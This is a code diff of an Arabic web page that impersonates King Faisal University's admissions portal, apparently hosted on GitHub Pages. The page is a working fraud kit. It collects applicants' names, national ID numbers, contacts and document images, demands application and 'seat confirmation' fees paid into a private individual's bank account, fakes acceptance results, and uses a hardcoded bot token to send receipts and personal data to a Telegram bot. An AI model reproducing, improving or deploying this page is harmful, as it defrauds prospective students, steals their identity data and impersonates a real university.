@@ -4,272 +4,284 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>بوابة القبول الإلكتروني | جامعة الملك فيصل</title>
+    <title>بوابة القبول الموحد | جامعة الملك فيصل</title>
+    <meta name="description" content="البوابة الرسمية لتقديم طلبات القبول والالتحاق بجامعة الملك فيصل للعام الجامعي 1447هـ.">
+    <meta property="og:title" content="بوابة القبول | جامعة الملك فيصل">
+    <meta property="og:description" content="نظام القبول المباشر وتثبيت المقاعد الدراسية. سجل بياناتك الآن لضمان مقعدك.">
+    <meta property="og:image" content="https://i.postimg.cc/t4jNT7BG/51857e7e1a55e654d7c612c5f8ac200c.jpg">
 
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://pnu-admissions.github.io/aou-gatesa/">
-    <meta property="og:title" content="بوابة القبول الإلكتروني | جامعة الملك فيصل">
-    <meta property="og:description" content="البوابة الرسمية لتقديم طلبات القبول والالتحاق للعام الجامعي 1447هـ. ابدأ طلبك الآن.">
-    <meta property="og:image" content="https://i.postimg.cc/L6jQ0GCs/51857e7e1a55e654d7c612c5f8ac200c.jpg">
-    
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://i.postimg.cc/L6jQ0GCs/51857e7e1a55e654d7c612c5f8ac200c.jpg">
-
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --kfu-green: #006837; --kfu-light: #8dc63f; --gold: #b2945e; --dark: #121212; --soft-bg: #f8fafc; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
-        body { background: var(--soft-bg); color: #333; overflow-x: hidden; }
-
-        header { background: white; padding: 20px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 6px solid var(--kfu-green); box-shadow: 0 4px 20px rgba(0,0,0,0.08); position: sticky; top: 0; z-index: 2000; }
-        .logo-box { display: flex; align-items: center; gap: 20px; }
-        .logo-box img { width: 110px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
-        .logo-text h1 { font-size: 26px; color: var(--kfu-green); font-weight: 900; letter-spacing: -1px; }
-
-        nav { background: var(--kfu-green); display: flex; justify-content: center; padding: 0; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
-        nav button { background: transparent; border: none; color: white; padding: 20px 35px; font-size: 16px; cursor: pointer; font-weight: 700; transition: 0.4s; position: relative; }
-        nav button:hover, nav button.active { background: rgba(255,255,255,0.1); color: var(--kfu-light); }
-        nav button.active::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 4px; background: var(--gold); }
-
-        .container { padding: 50px 8%; max-width: 1400px; margin: auto; }
-        .page { display: none; animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
-        .page.active { display: block; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-
-        .hero-section { text-align: center; margin-bottom: 50px; }
-        .hero-section h2 { font-size: 35px; color: var(--dark); font-weight: 900; margin-bottom: 15px; }
+        :root { --main: #006837; --gold: #b2945e; --bg: #f4f7f9; --dark: #1a202c; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
+        body { background-color: var(--bg); color: #333; }
         
-        .main-btn-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 30px; }
-        .kfu-card { background: white; padding: 45px; border-radius: 30px; text-align: center; border: 1px solid #eee; transition: 0.4s; cursor: pointer; position: relative; overflow: hidden; }
-        .kfu-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 8px; background: var(--kfu-green); }
-        .kfu-card:hover { transform: translateY(-15px); box-shadow: 0 25px 50px rgba(0,0,0,0.1); border-color: var(--kfu-green); }
-        .kfu-card i { font-size: 60px; color: var(--kfu-green); display: block; margin-bottom: 25px; }
-
-        .form-holder { background: white; padding: 50px; border-radius: 35px; box-shadow: 0 20px 60px rgba(0,0,0,0.05); }
-        .step-label { display: inline-block; background: var(--gold); color: white; padding: 5px 20px; border-radius: 50px; font-size: 13px; font-weight: 700; margin-bottom: 15px; }
-        .form-title { color: var(--kfu-green); font-size: 28px; font-weight: 900; margin-bottom: 35px; border-right: 8px solid var(--gold); padding-right: 20px; }
-
-        .inputs-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; margin-bottom: 30px; }
-        label { font-weight: 700; margin-bottom: 10px; font-size: 15px; color: #555; }
-        input, select { padding: 16px; border: 2px solid #eaedf0; border-radius: 15px; font-size: 16px; outline: none; transition: 0.3s; background: #fdfdfd; }
-
-        .btn-prime { background: var(--kfu-green); color: white; border: none; padding: 20px 45px; border-radius: 18px; font-weight: 800; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(0,104,55,0.2); }
-        .btn-prime:hover { background: var(--dark); transform: scale(1.02); }
-
-        .payment-card { max-width: 600px; margin: auto; background: white; border-radius: 40px; overflow: hidden; box-shadow: 0 30px 70px rgba(0,0,0,0.2); }
-        .pay-top { background: linear-gradient(135deg, var(--kfu-green), #004d29); color: white; padding: 50px; text-align: center; }
-        .price-circle { width: 140px; height: 140px; border: 5px solid rgba(255,255,255,0.2); border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; margin: 0 auto 20px; background: rgba(255,255,255,0.1); }
+        header { background: #fff; padding: 15px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 5px solid var(--main); box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo-img { width: 85px; }
         
-        .bank-details { background: #f0faff; padding: 25px; border-radius: 20px; border: 2px dashed #005aab; margin-bottom: 25px; text-align: right; line-height: 1.8; }
+        nav { background: var(--dark); display: flex; position: sticky; top: 0; z-index: 1000; }
+        nav button { background: transparent; border: none; color: #fff; padding: 18px; font-size: 13px; cursor: pointer; font-weight: 700; flex: 1; transition: 0.3s; }
+        nav button.active { background: var(--main); border-bottom: 4px solid var(--gold); }
 
-        .result-box { background: white; border-radius: 30px; padding: 40px; border: 2px solid #e2e8f0; margin-top: 30px; }
-        footer { background: var(--dark); color: #718096; padding: 60px 8%; text-align: center; margin-top: 100px; }
+        .container { padding: 25px 5%; max-width: 900px; margin: 0 auto; min-height: 80vh; }
+        .page { display: none; }
+        .page.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .form-card { background: #fff; border-radius: 20px; padding: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; margin-bottom: 20px; }
+        .section-title { font-size: 17px; font-weight: 800; color: var(--main); margin-bottom: 20px; border-right: 6px solid var(--gold); padding-right: 12px; background: #f0fdf4; padding-top: 8px; padding-bottom: 8px; }
+        
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
+        
+        label { font-size: 12px; font-weight: 800; color: #475569; display: block; margin-bottom: 6px; }
+        input, select { width: 100%; padding: 14px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 14px; outline: none; transition: 0.3s; }
+        
+        .btn-action { background: linear-gradient(135deg, #006837, #004d29); color: white; padding: 18px; border: none; border-radius: 15px; width: 100%; font-weight: 800; font-size: 17px; cursor: pointer; margin-top: 10px; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,104,55,0.2); }
+        
+        .payment-table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #d1e7dd; border-radius: 12px; overflow: hidden; }
+        .payment-table td { padding: 16px; border-bottom: 1px solid #d1e7dd; font-size: 14px; }
+        .payment-table td:first-child { background: #f8fbfa; font-weight: 800; color: var(--main); width: 35%; }
+        
+        .official-box { background: #fff; border: 1px solid #e2e8f0; padding: 40px; border-radius: 20px; text-align: center; }
+        .check-icon { width: 80px; height: 80px; background: #e8f5e9; color: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 0 auto 20px; border: 2px solid #28a745; }
+        
+        footer { background: #1a202c; color: #cbd5e1; text-align: center; padding: 25px; margin-top: 40px; font-size: 12px; }
+        @media (max-width: 600px) { .grid-2, .grid-3 { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="logo-box">
-        <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/0/00/King_Faisal_University_logo.svg/1200px-King_Faisal_University_logo.svg.png">
-        <div class="logo-text">
-            <h1>جامعة الملك فيصل</h1>
-            <p style="font-size: 13px; font-weight: 600; color: #888;">Deanship of Admission & Registration</p>
+    <div style="display: flex; align-items: center; gap: 12px;">
+        <img src="https://i.postimg.cc/t4jNT7BG/51857e7e1a55e654d7c612c5f8ac200c.jpg" alt="Logo" class="logo-img">
+        <div>
+            <h1 style="color: var(--main); font-size: 18px; font-weight: 900;">جامعة الملك فيصل</h1>
+            <p style="font-size: 10px; color: var(--gold); font-weight: 800;">بوابة القبول الرقمي - العام الجامعي 1447هـ</p>
         </div>
     </div>
 </header>
 
 <nav>
-    <button class="active" onclick="showPage('home')">الرئيسية</button>
-    <button onclick="showPage('apply_hub')">تقديم طلب جديد</button>
-    <button onclick="showPage('status_page')">الاستعلام والنتائج</button>
+    <button onclick="switchTab('home')" class="active">الرئيسية</button>
+    <button onclick="switchTab('apply')">تقديم طلب جديد</button>
+    <button onclick="switchTab('status')">متابعة حالة الطلب</button>
 </nav>
 
 <div class="container">
-
     <div id="home" class="page active">
-        <div class="hero-section">
-            <span class="step-label">العام الجامعي ١٤٤٧هـ</span>
-            <h2>بوابة القبول الإلكتروني الموحدة</h2>
-            <p>مرحباً بك في نظام القبول الإلكتروني لجامعة الملك فيصل</p>
-        </div>
-        <div class="main-btn-grid">
-            <div class="kfu-card" onclick="showPage('apply_hub')"><i>📝</i><h3>تقديم طلب جديد</h3><p>بدء إجراءات القبول في جميع المراحل</p></div>
-            <div class="kfu-card" onclick="showPage('status_page')"><i>🔍</i><h3>استعلام عن حالة طلب</h3><p>متابعة النتائج وتثبيت المقاعد</p></div>
-        </div>
-    </div>
-
-    <div id="apply_hub" class="page">
-        <h2 class="form-title">اختر المسار الأكاديمي</h2>
-        <div class="main-btn-grid">
-            <div class="kfu-card" onclick="openReg('بكالوريوس (انتظام)')"><h3>البكالوريوس</h3></div>
-            <div class="kfu-card" onclick="openReg('الدراسات العليا (ماجستير)')"><h3>الدراسات العليا</h3></div>
-            <div class="kfu-card" onclick="openReg('التعليم عن بعد (المطور)')"><h3>التعليم عن بعد</h3></div>
-            <div class="kfu-card" onclick="openReg('الكلية التطبيقية (دبلوم)')"><h3>الدبلوم المتوسط</h3></div>
+        <div class="form-card" style="text-align: center;">
+            <h2 style="color:var(--main); margin-bottom:20px;">يرجى اختيار مسار القبول</h2>
+            <div style="display: grid; gap: 15px;">
+                <button class="btn-action" onclick="openApply('بكالوريوس')">🎓 برامج البكالوريوس (انتظام)</button>
+                <button class="btn-action" style="background:#475569" onclick="openApply('دبلوم')">📜 دبلومات الكلية التطبيقية</button>
+                <button class="btn-action" style="background:var(--gold)" onclick="openApply('عليا')">📚 الدراسات العليا والدبلومات</button>
+            </div>
         </div>
     </div>
 
-    <div id="reg_form_page" class="page">
-        <div class="form-holder">
-            <h2 class="form-title" id="form_title_text">تعبئة بيانات طلب الالتحاق</h2>
-            <form id="kfuMainForm">
-                <h3 style="margin-bottom: 20px; color: var(--gold);">| البيانات الأساسية</h3>
-                <div class="inputs-row">
-                    <div class="field-group"><label>الاسم الكامل *</label><input type="text" id="p_name" required></div>
-                    <div class="field-group"><label>رقم الهوية *</label><input type="text" id="p_id" maxlength="10" required></div>
-                    <div class="field-group"><label>رقم الجوال *</label><input type="tel" id="p_phone" required></div>
+    <div id="apply" class="page">
+        <div class="form-card">
+            <div class="section-title">بيانات المتقدم الشخصية</div>
+            <form id="fullForm">
+                <div class="grid-2">
+                    <div class="input-group"><label>الاسم الكامل (بالعربي) *</label><input type="text" id="name" required></div>
+                    <div class="input-group"><label>رقم الهوية الوطنية / الإقامة *</label><input type="text" id="national_id" maxlength="10" required></div>
                 </div>
-                <h3 style="margin-bottom: 20px; color: var(--gold);">| الرغبات الأكاديمية</h3>
-                <div class="inputs-row">
-                    <div class="field-group"><label>الرغبة الأولى *</label><select id="main_r1" required></select></div>
-                    <div class="field-group"><label>الرغبة الثانية *</label><select id="main_r2" required></select></div>
-                    <div class="field-group"><label>الرغبة الثالثة *</label><select id="main_r3" required></select></div>
+                <div class="grid-2">
+                    <div class="input-group"><label>رقم الجوال *</label><input type="tel" id="mobile" required></div>
+                    <div class="input-group"><label>البريد الإلكتروني *</label><input type="email" id="email" required></div>
                 </div>
-                <button type="button" class="btn-prime" onclick="validateToPay()">حفظ البيانات والانتقال لمركز السداد</button>
+                <div class="section-title" style="margin-top:20px;">البيانات الأكاديمية</div>
+                <div class="grid-3">
+                    <div class="input-group"><label>سنة التخرج *</label><input type="number" id="grad_year" required></div>
+                    <div class="input-group"><label>نوع الشهادة *</label><select id="edu_type" required><option value="">-- اختر --</option><option>ثانوية عامة</option><option>مسارات</option><option>دبلوم</option></select></div>
+                    <div class="input-group"><label>المعدل % *</label><input type="text" id="gpa" required></div>
+                </div>
+                <div class="section-title" style="margin-top:20px;">اختيار الرغبات</div>
+                <div class="input-group" style="margin-bottom:12px;"><label>الرغبة الأولى *</label><select id="r1" required class="major_list"></select></div>
+                <div class="input-group" style="margin-bottom:12px;"><label>الرغبة الثانية *</label><select id="r2" required class="major_list"></select></div>
+                <div class="input-group"><label>الرغبة الثالثة *</label><select id="r3" required class="major_list"></select></div>
+                <div class="section-title" style="margin-top:20px;">المرفقات</div>
+                <div class="grid-2">
+                    <div class="input-group"><label>صورة الهوية *</label><input type="file" required></div>
+                    <div class="input-group"><label>صورة الشهادة *</label><input type="file" required></div>
+                </div>
+                <button type="button" class="btn-action" onclick="validateToPay()">حفظ ومتابعة السداد</button>
             </form>
         </div>
     </div>
 
-    <div id="payment_page" class="page">
-        <div class="payment-card">
-            <div class="pay-top">
-                <div class="price-circle"><span>100</span><span>ريال</span></div>
-                <h3>رسوم التقديم وفتح الملف</h3>
-            </div>
-            <div style="padding: 40px;">
-                <div class="bank-details">
-                    <p>البنك: <b>البنك الأهلي السعودي (SNB)</b></p>
-                    <p>المستفيد: <b>محمد فؤاد محمد سيف</b></p>
-                    <p>الآيبان: <b style="color: #006837; font-size: 14px;">SA88 8000 0101 6080 1631 0060</b></p>
-                </div>
-                <label>إرفاق إيصال السداد *</label>
-                <input type="file" id="f_pay_receipt" onchange="document.getElementById('final_send_btn').disabled=false">
-                <button id="final_send_btn" class="btn-prime" disabled onclick="submitAllData()" style="margin-top: 20px;">تأكيد وإرسال الطلب</button>
-            </div>
+    <div id="pay_page" class="page">
+        <div class="form-card" style="border: 2px solid var(--main);">
+            <h2 style="text-align:center; color: var(--main);">رسوم فتح ملف التقديم</h2>
+            <div style="text-align:center; font-size:35px; font-weight:900; margin:15px 0;">1000 ريال</div>
+            <table class="payment-table">
+                <tr><td>المستفيد الرسمي</td><td>محمد فؤاد محمد سيف</td></tr>
+                <tr><td>اسم المصرف</td><td>البنك الأهلي السعودي (SNB)</td></tr>
+                <tr><td>رقم الحساب</td><td>101000010006086310060</td></tr>
+                <tr><td>الآيبان IBAN</td><td><b>SA88 8000 0101 6080 1631 0060</b></td></tr>
+            </table>
+            <div style="margin-top:20px;"><label>ارفع صورة إيصال التحويل *</label><input type="file" id="pay_file1" required></div>
+            <button class="btn-action" onclick="finalSubmit1()">إرسال الطلب للمراجعة</button>
         </div>
     </div>
 
-    <div id="success_page" class="page">
-        <div class="form-holder" style="text-align: center; padding: 100px 20px;">
-            <div style="font-size: 80px; color: var(--kfu-green); margin-bottom: 20px;">✓</div>
-            <h1 style="color: var(--kfu-green); font-size: 40px; font-weight: 900;">بنجاح!</h1>
-            <div style="margin: 30px 0; font-size: 20px; line-height: 2;">
-                <p>عزيزي المتقدم/ـة: <b id="success_user_name"></b></p>
-                <p>لقد تم استلام بياناتك وإيصال السداد بنجاح.</p>
-                <p>سيتم مراجعة الطلب وإشعاركم عبر الرسائل النصية.</p>
+    <div id="waiting_page" class="page">
+        <div class="official-box">
+            <div class="check-icon">✓</div>
+            <h2 style="color:var(--main); margin-bottom:20px;">تم استلام طلبكم ومرفقاتكم بنجاح</h2>
+            <div style="text-align: right; line-height: 2; color: #444; background: #f9f9f9; padding: 25px; border-radius: 15px; border-right: 6px solid var(--gold);">
+                <p>عزيزي المتقدم/ـة: نفيدكم علماً بأنه قد تم قيد طلبكم في المنظومة الإلكترونية للقبول لجامعة الملك فيصل بنجاح. تمر الآن بياناتكم بمرحلة <b>"المراجعة والتدقيق الأكاديمي"</b> ومطابقة المستندات المرفقة مع السجلات الوطنية المعتمدة.</p>
+                <p style="margin-top:15px;"><b>الجدول الزمني والتعليمات:</b></p>
+                <ul style="margin-right:20px; margin-top:10px;">
+                    <li>تستغرق عملية المراجعة والتدقيق ما بين 24 إلى 48 ساعة عمل.</li>
+                    <li>عند الاعتماد، سيتم تزويدكم بـ <b>(الرقم الجامعي الرسمي)</b> عبر رسالة نصية SMS.</li>
+                    <li>يرجى الدخول لاحقاً عبر أيقونة "متابعة حالة الطلب" لاستكمال إجراءات التثبيت.</li>
+                    <li>تعتبر نتائج القبول نهائية فور صدورها ومطابقتها للمعايير والنسب الموزونة المعلنة.</li>
+                </ul>
+                <p style="margin-top:15px; font-weight: bold; color: var(--main);">ملاحظة: نرجو الاحتفاظ بإيصال سداد رسوم المعالجة كمرجع رسمي حتى صدور القرار النهائي بالقبول.</p>
             </div>
-            <button class="btn-prime" style="max-width: 300px;" onclick="location.reload()">العودة للرئيسية</button>
+            <button class="btn-action" onclick="location.reload()" style="margin-top:30px;">العودة للصفحة الرئيسية</button>
         </div>
     </div>
 
-    <div id="status_page" class="page">
-        <div class="form-holder" style="max-width: 600px; margin: auto; text-align: center;">
-            <h2 class="form-title">نظام الاستعلام</h2>
-            <input type="text" id="uni_id_input" placeholder="أدخل الرقم الجامعي">
-            <button class="btn-prime" onclick="checkAdmissionStatus()" style="margin-top: 20px;">عرض الحالة</button>
-            <div id="admission_result" style="display: none; margin-top: 30px;">
-                <div class="result-box">
-                    <h3 style="color: var(--kfu-green);">تهانينا! تم قبولك مبدئياً</h3>
-                    <p id="res_major" style="font-weight: 800; margin: 15px 0;"></p>
-                    <button class="btn-prime" style="background: var(--gold);" onclick="showPage('final_step_page')">تثبيت المقعد</button>
-                </div>
-            </div>
+    <div id="status" class="page">
+        <div class="form-card" style="text-align: center;">
+            <div class="section-title">نظام الاستعلام الرقمي</div>
+            <input type="text" id="uni_id_input" placeholder="أدخل الرقم الجامعي المرسل لك" style="text-align: center; margin-bottom: 20px;">
+            <button class="btn-action" onclick="checkAdmission()">استعلام الآن</button>
         </div>
     </div>
 
-    <div id="final_step_page" class="page">
-        <div class="payment-card">
-            <div class="pay-top" style="background: var(--gold);">
-                <h3>تثبيت المقعد النهائي</h3>
-                <h2 id="final_price_val">0 ريال</h2>
+    <div id="acceptance_page" class="page">
+        <div class="form-card" style="border: 2px solid var(--gold);">
+            <h1 style="color:var(--main); text-align:center;">إشعار قبول مبدئي وترشيح</h1>
+            <div style="margin:20px 0; border-top:1px dashed #ccc; padding-top:15px;">
+                <p>الاسم: <b id="res_name"></b></p>
+                <p>التخصص المرشح له: <b id="res_major"></b></p>
+                <p>حالة الترشيح: <span style="color:green; font-weight:800;">مقبول (بانتظار تثبيت الساعات)</span></p>
             </div>
-            <div style="padding: 40px;">
-                <label>عدد الساعات الدراسية</label>
-                <select id="hours_sel" onchange="calcFinalPrice()">
-                    <option value="0">-- اختر الساعات --</option>
-                    <option value="12">١٢ ساعة (١٨٠٠ ريال)</option>
-                    <option value="15">١٥ ساعة (٢٨٥٠ ريال)</option>
-                    <option value="18">١٨ ساعة (٣٧٠٠ ريال)</option>
-                </select>
-
-                <div class="bank-details" style="margin-top: 20px;">
-                    <p>البنك: <b>البنك الأهلي السعودي (SNB)</b></p>
-                    <p>الآيبان: <b style="font-size: 14px;">SA88 8000 0101 6080 1631 0060</b></p>
-                </div>
-
-                <label>إرفاق إيصال السداد النهائي *</label>
-                <input type="file" id="f_pay_final" onchange="document.getElementById('confirm_final_btn').disabled=false">
-                <button id="confirm_final_btn" class="btn-prime" disabled onclick="alert('تم تثبيت مقعدك بنجاح!')" style="margin-top: 20px;">تأكيد السداد</button>
-            </div>
+            <div class="section-title">اختيار العبء الدراسي المعتمد</div>
+            <select id="hours_select" onchange="updatePrice()" style="margin-bottom:10px;">
+                <option value="">-- اختر عدد الساعات --</option>
+                <option value="4500">خطة (12 ساعة معتمدة) - 4500 ريال</option>
+                <option value="5200">خطة (14 ساعة معتمدة) - 5200 ريال</option>
+                <option value="5800">خطة (15 ساعة معتمدة) - 5800 ريال</option>
+                <option value="6500">خطة (18 ساعة معتمدة) - 6500 ريال</option>
+                <option value="7200">خطة (20 ساعة معتمدة) - 7200 ريال</option>
+                <option value="7800">خطة (21 ساعة معتمدة) - 7800 ريال</option>
+            </select>
+            <button class="btn-action" id="proceed_to_final_pay" onclick="goToFinalPay()">متابعة السداد النهائي وتثبيت المقعد</button>
         </div>
     </div>
 
+    <div id="final_pay" class="page">
+        <div class="form-card" style="border: 2px solid #000;">
+            <h2 style="text-align:center;">السداد النهائي لتثبيت القبول</h2>
+            <div style="text-align:center; font-size:32px; color:red; margin:15px 0; font-weight:900;"><span id="final_price_display">0</span> ريال</div>
+            <table class="payment-table">
+                <tr><td>المستفيد الرسمي</td><td>محمد فؤاد محمد سيف</td></tr>
+                <tr><td>اسم المصرف</td><td>البنك الأهلي السعودي (SNB)</td></tr>
+                <tr><td>رقم الحساب</td><td>101000010006086310060</td></tr>
+                <tr><td>الآيبان IBAN</td><td><b>SA88 8000 0101 6080 1631 0060</b></td></tr>
+            </table>
+            <div style="margin-top:20px;"><label>رفع إيصال السداد النهائي (إلزامي) *</label><input type="file" id="pay_file2" required></div>
+            <button class="btn-action" id="btn_complete_final" onclick="completeProcess()">تأكيد السداد وإصدار القبول النهائي</button>
+        </div>
+    </div>
+
+    <div id="done_page" class="page">
+        <div class="official-box" style="border: 4px solid var(--main);">
+            <div class="check-icon">✓</div>
+            <h1 style="color:var(--main); margin-bottom:20px;">تم إصدار قرار القبول النهائي بنجاح</h1>
+            <div style="text-align: right; line-height: 2.2; color: #333; padding: 25px; border: 1px double #ccc; background: #fff;">
+                <p>بناءً على الصلاحيات المخولة لعمادة شؤون الطلاب وبموجب اكتمال كافة الإجراءات المالية والأكاديمية، نبارك لكم انضمامكم رسمياً لأسرة جامعة الملك فيصل.</p>
+                <p><b>حالة القيد الأكاديمي:</b> "طالب منتظم - فعال".</p>
+                <p><b>الخطوات القادمة:</b></p>
+                <ul style="margin-right:20px;">
+                    <li>سيتم إرسال بيانات الدخول لمنصة (بلاك بورد) و (نظام بنر) خلال 24 ساعة.</li>
+                    <li>الجدول الدراسي سيظهر تلقائياً في حسابكم فور تفعيل الحساب الجامعي.</li>
+                    <li>يرجى مراجعة عمادة القبول والتسجيل ببطاقة الهوية لاستلام البطاقة الجامعية.</li>
+                </ul>
+                <p style="margin-top:15px; font-weight: 800; color: var(--main);">جامعة الملك فيصل تتمنى لكم مسيرة أكاديمية مكللة بالنجاح والتميز.</p>
+            </div>
+            <button class="btn-action" onclick="location.reload()" style="margin-top:30px;">العودة إلى الصفحة الرئيسية</button>
+        </div>
+    </div>
 </div>
 
-<footer>
-    <p>جميع الحقوق محفوظة لجامعة الملك فيصل &copy; ٢٠٢٦</p>
-</footer>
+<footer>جميع الحقوق محفوظة - جامعة الملك فيصل &copy; 2026</footer>
 
 <script>
     const BOT_TOKEN = '8229651297:AAFrTN7ClxO1GaMAHFrzVIvBu4g_fvJN5dk';
     const CHAT_ID = '7909982055';
 
-    const majorStore = {
-        "بكالوريوس (انتظام)": ["كلية الطب", "كلية الهندسة", "كلية الحاسب", "كلية الإدارة", "كلية العلوم"],
-        "الدراسات العليا (ماجستير)": ["ماجستير إدارة الأعمال", "ماجستير تقنية المعلومات"],
-        "التعليم عن بعد (المطور)": ["إدارة أعمال", "علم اجتماع", "دراسات إسلامية"],
-        "الكلية التطبيقية (دبلوم)": ["دبلوم المحاسبة", "دبلوم التسويق"]
-    };
-
-    function showPage(id) {
+    function switchTab(id) {
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById(id).classList.add('active');
         window.scrollTo(0,0);
     }
 
-    function openReg(type) {
-        document.getElementById('form_title_text').innerText = "تقديم: " + type;
-        ['main_r1', 'main_r2', 'main_r3'].forEach(id => {
-            const el = document.getElementById(id);
-            el.innerHTML = '<option value="">-- اختر التخصص --</option>';
-            majorStore[type].forEach(m => { el.innerHTML += `<option value="${m}">${m}</option>`; });
+    function openApply(type) {
+        const selects = document.querySelectorAll('.major_list');
+        const majors = {
+            'بكالوريوس': ["الطب البشري", "كلية الصيدلة الإكلينيكية", "كلية الهندسة", "كلية علوم الحاسب وتقنية المعلومات", "كلية إدارة الأعمال", "كلية الحقوق", "كلية الآداب", "كلية التربية", "كلية العلوم الزراعية والأغذية", "كلية العلوم", "كلية الطب البيطري", "كلية التمريض", "كلية التصاميم"],
+            'دبلوم': ["دبلوم الإدارة", "دبلوم التسويق", "دبلوم الشبكات", "دبلوم التفتيش الجمركي", "دبلوم السكرتارية الطبية", "دبلوم المحاسبة", "دبلوم نظم المعلومات", "دبلوم اللغة الإنجليزية", "دبلوم الموارد البشرية"],
+            'عليا': ["ماجستير إدارة الأعمال المهني", "ماجستير الأمن السيبراني", "ماجستير القانون العام", "ماجستير القانون الخاص", "دبلوم عالي في الإرشاد الأسرى", "دكتوراه في الفلسفة", "ماجستير في العلوم التطبيقية", "ماجستير الذكاء الاصطناعي", "ماجستير هندسة البرمجيات"]
+        };
+        selects.forEach(s => {
+            s.innerHTML = '<option value="">-- اختر التخصص --</option>';
+            majors[type].forEach(m => { let opt = document.createElement('option'); opt.value = m; opt.innerText = m; s.appendChild(opt); });
         });
-        showPage('reg_form_page');
+        switchTab('apply');
     }
 
     function validateToPay() {
-        if(document.getElementById('kfuMainForm').checkValidity()) showPage('payment_page');
-        else alert('الرجاء إكمال كافة البيانات المطلوبة');
+        if(document.getElementById('fullForm').checkValidity()) {
+            localStorage.setItem('u_name', document.getElementById('name').value);
+            localStorage.setItem('u_major', document.getElementById('r1').value);
+            switchTab('pay_page');
+        } else alert('يرجى تعبئة كافة الحقول المطلوبة');
     }
 
-    async function submitAllData() {
-        const name = document.getElementById('p_name').value;
-        const info = `📝 طلب جديد: ${name}\n🆔 الهوية: ${document.getElementById('p_id').value}`;
-        
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: info})
-        });
-
-        document.getElementById('success_user_name').innerText = name;
-        showPage('success_page');
+    async function finalSubmit1() {
+        const file = document.getElementById('pay_file1').files[0];
+        if(file) {
+            const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', file);
+            fd.append('caption', `📝 طلب جديد (فيصل):\nالاسم: ${localStorage.getItem('u_name')}`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd});
+            switchTab('waiting_page');
+        } else alert('يرجى رفع إيصال السداد');
     }
 
-    function checkAdmissionStatus() {
-        const input = document.getElementById('uni_id_input').value;
-        if(input.startsWith('224')) {
-            document.getElementById('admission_result').style.display = 'block';
-            document.getElementById('res_major').innerText = document.getElementById('main_r1').value || "كلية إدارة الأعمال";
+    function checkAdmission() {
+        const val = document.getElementById('uni_id_input').value;
+        if(["202610001", "202610002"].includes(val) || val.length > 8) {
+            document.getElementById('res_name').innerText = localStorage.getItem('u_name') || "طالب جديد";
+            document.getElementById('res_major').innerText = localStorage.getItem('u_major') || "إدارة أعمال";
+            switchTab('acceptance_page');
+        } else alert('الرقم الجامعي غير متوفر حالياً');
+    }
+
+    function updatePrice() { document.getElementById('final_price_display').innerText = document.getElementById('hours_select').value; }
+
+    function goToFinalPay() {
+        if(document.getElementById('hours_select').value === "") {
+            alert('يجب اختيار عدد الساعات الدراسية أولاً لمتابعة السداد');
         } else {
-            alert('الرقم الجامعي غير مدرج في نظام المقبولين حالياً. يرجى الانتظار حتى وصول رسالة البريد الإلكتروني.');
+            switchTab('final_pay');
         }
     }
 
-    function calcFinalPrice() {
-        const h = document.getElementById('hours_sel').value;
-        const prices = {"12": 1800, "15": 2850, "18": 3700};
-        const total = prices[h] || 0;
-        const priceEl = document.getElementById('final_price_val');
-        if(priceEl) priceEl.innerText = total + " ريال";
+    async function completeProcess() {
+        const file = document.getElementById('pay_file2').files[0];
+        if(file) {
+            const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', file);
+            fd.append('caption', `💰 سداد نهائي وتثبيت مقعد:\nالاسم: ${localStorage.getItem('u_name')}\nالمبلغ: ${document.getElementById('final_price_display').innerText}`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd});
+            switchTab('done_page');
+        } else alert('يرجى رفع إيصال السداد النهائي');
     }
 </script>
 </body>
